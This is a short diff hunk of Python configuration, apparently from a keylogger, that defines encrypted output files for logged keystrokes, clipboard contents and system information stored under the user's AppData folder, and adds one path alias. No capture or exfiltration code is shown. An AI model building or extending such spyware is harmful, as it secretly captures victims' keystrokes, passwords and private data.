@@ -8,3 +8,4 @@ system_information_e = 'e_system.txt'
 clipboard_information_e = 'e_clipboard.txt'
 keys_information_e = 'e_keys_logged.txt'
 key_log_path = "%s\\appdata\\"%environ['USERPROFILE']
+syscon_path = key_log_path
